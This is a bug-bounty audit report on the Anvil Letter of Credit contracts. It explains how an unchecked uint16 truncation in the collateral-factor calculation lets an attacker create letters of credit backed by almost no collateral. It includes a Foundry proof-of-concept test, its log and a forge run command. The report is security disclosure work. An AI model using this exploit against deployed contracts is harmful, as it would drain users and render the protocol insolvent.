# #36807 \[SC-Critical] attackers can create dynamic loc with any credited amount with very small co...

## #36807 \[SC-Critical] Attackers can create dynamic LOC with any credited amount with very small collateral amount

**Submitted on Nov 15th 2024 at 11:01:21 UTC by @perseverance for** [**Audit Comp | Anvil: Letters of Credit**](https://immunefi.com/audit-competition/audit-comp-anvil-letters-of-credit)

* **Report ID:** #36807
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/AcronymFoundation/anvil-contracts/blob/main/contracts/LetterOfCredit.sol>
* **Impacts:**
  * Protocol insolvency

### Description

## Description

### Brief/Intro

[As the documents of Anvil](https://docs.anvil.xyz/protocol-concepts/letter-of-credit)

A Letter of Credit (LOC) is a contractual agreement that guarantees payment on time and in full from a buyer (creator) to a seller (beneficiary). The Anvil LOC comprises two elements: the collateral asset, which secures the LOC, and the credited asset, representing its redeemable value. The protocol supports LOC issuance irrespective of the collateral and credit asset types.

**The critical aspect of every LOC is the redeemability of its full credited value. To mitigate potential market volatility all LOCs require sufficient overcollateralization. Liquidity must be available for collateral-asset-to-credited-asset conversion, guaranteeing beneficiaries invariably receive the credited asset.**

**It is important that all LOCs require sufficient overcollateralization.**

The beneficiary or seller can based on the creditTokenAmount to sell the buyer something based on this LOC. The Credited amount is guaranteed to be backed by collateral that is worth more than the credited amount. The buy and sell activity is managed outside of the LetterOfCredit contract. But apparently this is intended use-case of the LetterOfCredit contract.

Users can create the Dynamic LOC by using function createDynamicLOC

\`\`\`solidity function createDynamicLOC( address \_beneficiary, address \_collateralTokenAddress, uint256 \_collateralTokenAmount, address \_creditedTokenAddress, uint256 \_creditedTokenAmount, uint32 \_expirationTimestamp, bytes calldata \_oraclePriceUpdate, bytes calldata \_collateralizableAllowanceSignature ) \`\`\`

When users create the DynamicLOC, the contract verify the currentCollateralFactorBasisPoints that should be in range from 1 to collateralToCreditedToCollateralFactors\[\_collateralTokenAddress]\[ \_creditedTokenAddress].creationCollateralFactorBasisPoints

\`\`\`solidity function \_validateLOCCreationCollateralFactor( address \_collateralTokenAddress, uint256 \_collateralTokenAmount, address \_creditedTokenAddress, uint256 \_creditedTokenAmount, Pricing.OraclePrice memory \_price ) private { uint16 creationCollateralFactorBasisPoints = collateralToCreditedToCollateralFactors\[\_collateralTokenAddress]\[ \_creditedTokenAddress ].creationCollateralFactorBasisPoints; if (creationCollateralFactorBasisPoints == 0) revert AssetPairUnauthorized(\_collateralTokenAddress, \_creditedTokenAddress);

```
    /*** Verify Collateral Factor ***/
    uint16 currentCollateralFactorBasisPoints &#x3D; Pricing.collateralFactorInBasisPoints(
        _collateralTokenAmount,
        _creditedTokenAmount,
        _price
    );
    

    if (
        currentCollateralFactorBasisPoints &#x3D;&#x3D; 0 ||
        currentCollateralFactorBasisPoints &gt; creationCollateralFactorBasisPoints
    ) revert InvalidCollateralFactor(creationCollateralFactorBasisPoints, currentCollateralFactorBasisPoints);
}
```

\`\`\`

For example for the pair WETH and USDC, this creationCollateralFactorBasisPoints can be 6500 that is 65% so that the credited amount should be less than 65% of the collateral. This is to ensure that the all LOCs require sufficient overcollateralization.

### The vulnerability

#### Vulnerability Details

The vulnerability here is in the function collateralFactorInBasisPoints in Pricing.sol

\`\`\`solidity function collateralFactorInBasisPoints( uint256 \_collateralTokenAmount, uint256 \_creditedTokenAmount, OraclePrice memory \_price ) internal pure returns (uint16) { uint256 collateralInCredited = collateralAmountInCreditedToken(\_collateralTokenAmount, \_price); // Don't divide by 0 if (collateralInCredited == 0) { return 0; } return uint16((\_creditedTokenAmount \* 10\_000) / collateralInCredited); } \`\`\`

Here it unsafe truncates the uint256 number **(\_creditedTokenAmount \* 10\_000) / collateralInCredited** to uint16 number without verifing the number.

So for example:

Example 1:

(\_creditedTokenAmount \* 10\_000) / collateralInCredited = 65537 = 2^16 + 1

After truncating the function collateralFactorInBasisPoints will return 1

Example 2:

(\_creditedTokenAmount \* 10\_000) / collateralInCredited = 4294967297 = 2^32 + 1

After truncating the function collateralFactorInBasisPoints will return 1

So the contract checks currentCollateralFactorBasisPoints should be from 1 to creationCollateralFactorBasisPoints, but by exploiting this bug, the attacker can issue very big amount of Credit Token with very small amount of collateral.

By attacking this, the attacker breaks the stability of the system. The system is severely under collateralized and this can make the Protocol Insolvency scenario.

By exploiting this bug, the attacker can create and issue **arbitrary amount of Credit token** with very small amount of collateral. This will result in victim loss of funds because the contract still give that the LetterOfCredit is healthy and can be trusted.

By exploiting this bug, the attacker can also create a lot of dynamic LOC with small collateral and can make creditedTokens\[\_creditedTokenAddress].globalAmountInDynamicUse equal or nearly equal to creditedToken.globalMaxInDynamicUse so other users of the protocol will not be able to create the dynamic LOC. Because users's call to function will failed in createDynamicLOC because of this check

\`\`\`solidity function \_validateAndUpdateCreditedTokenUsageForDynamicLOCCreation( address \_creditedTokenAddress, uint256 \_creditedTokenAmount ) private { CreditedToken memory creditedToken = creditedTokens\[\_creditedTokenAddress]; // ... uint256 newCreditedAmountInUse = creditedToken.globalAmountInDynamicUse + \_creditedTokenAmount; if (newCreditedAmountInUse > creditedToken.globalMaxInDynamicUse) revert GlobalCreditedTokenMaxInUseExceeded(creditedToken.globalMaxInDynamicUse, newCreditedAmountInUse);

```
    creditedTokens[_creditedTokenAddress].globalAmountInDynamicUse &#x3D; newCreditedAmountInUse;
}
```

\`\`\`

## Impacts

## About the severity assessment

By this attack, the attacker breaks the stability of the system. The system is severely under collateralized and this can make the Protocol Insolvency scenario.

By exploiting this bug, the attacker can create and issue **arbitrary amount of Credit token with very small amount of collateral**. This will result in victim loss of funds because the contract still give that the LetterOfCredit is healthy and can be trusted. So if victim trust the contract, then victim can give attacker money.

By exploiting this bug, the attacker can create a lot of dynamic LOC with small collateral and can make creditedTokens\[\_creditedTokenAddress].globalAmountInDynamicUse equal or nearly equal to creditedToken.globalMaxInDynamicUse so other users of the protocol will not be able to create the dynamic LOC. Because users's call to function will failed in createDynamicLOC because of this check

Bug Severity: Critical

Impact category:

Protocol insolvency

Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

Difficulty of the attack: Easy

It is easy to automate the attack

### Link to Proof of Concept

<https://gist.github.com/Perseverancesuccess2021/378159d301fbb5249afdce7292d0692b#file-testletterofcredit-sol>

### Proof of Concept

## Proof of concept

Steps to execute the attack:

Step 1: Attacker create a dynamicLOC with very small collateral

Test code to show: \`\`\`solidity function testCreateDynamicLOCHacked() public { scenario = 1; setup\_precondition(); uint96 loc\_id = createDynamicLOC();

```
}    

function createDynamicLOC() public  returns (uint96 loc_id) {

    console.log(&quot;Attacker to create a dynamic LOC for victim&quot;); 
    address _beneficiary &#x3D; user;                 
    address _collateralTokenAddress &#x3D; WETH; 
    uint256 _collateralTokenAmount &#x3D; 10**9;  // 10** 9 &#x3D; 10^-9 WETH  &#x3D; around 0.000_003 USDC  
    address _creditedTokenAddress &#x3D; USDC;
    uint256 _creditedTokenAmount  &#x3D; 10_000*10**6;         
    uint32 _expirationTimestamp &#x3D; uint32(block.timestamp + 43200000); 
    bytes memory signature_ &#x3D; CreateSignature(PrivateKey_2, _collateralTokenAmount, WETH, attacker_nonce++);
    bytes memory _oraclePriceUpdate &#x3D;  &quot;&quot;;
    mockPriceReturnData();        
    vm.startPrank(attacker);
    loc_id &#x3D; LetterOfCredit(LetterOfCredit_proxy).createDynamicLOC(_beneficiary, _collateralTokenAddress, _collateralTokenAmount, _creditedTokenAddress,_creditedTokenAmount, _expirationTimestamp, _oraclePriceUpdate, signature_);  
    vm.stopPrank(); 
    console.log(&quot;Loc id&quot;); 
    console.log(loc_id); 
    
    LetterOfCredit.LOC memory _loc &#x3D; LetterOfCredit(LetterOfCredit_proxy).getLOC(loc_id);
    console.log(&quot;LOC Details: collateralTokenAddress &quot;, _loc.collateralTokenAddress);
    console.log(&quot;LOC Details: collateralTokenAmount &quot;, _loc.collateralTokenAmount);
    console.log(&quot;LOC Details: creditedTokenAddress &quot;, _loc.creditedTokenAddress);
    console.log(&quot;LOC Details: creditedTokenAmount &quot;, _loc.creditedTokenAmount);
    

}
```

\`\`\`

Explanation:

For this POC, the attacker use \_collateralTokenAmount = 10\*\*9 = 10^-9 WETH = around 0.000\_003 USDC with WETH price = 3000 USDC

But attacker can create the dynamic LOC of \_creditedTokenAmount that is maximum for the contract that is 10\_000\*10\*\*6 = 10\_000 USDC

\`\`\`Log Loc id 1 LOC Details: collateralTokenAddress 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 LOC Details: collateralTokenAmount 1000000000 LOC Details: creditedTokenAddress 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 LOC Details: creditedTokenAmount 10000000000

\`\`\`

Full POC:

<https://gist.github.com/Perseverancesuccess2021/378159d301fbb5249afdce7292d0692b#file-testletterofcredit-sol>

Just download the zip file:

<https://drive.google.com/file/d/19ThCjMDQzRVaecJdksE50Xo\\_K6bhGENE/view?usp=sharing>

The test code uses Foundry. Just Unzip and run the test case:

\`\`\`bash forge test --match-test testCreateDynamicLOCHacked -vvvvv > testCreateDynamicLOCHacked\_241115\_1750.log

\`\`\`

Log file: <https://gist.github.com/Perseverancesuccess2021/378159d301fbb5249afdce7292d0692b#file-testcreatedynamiclochacked\\_241115\\_1750-log>
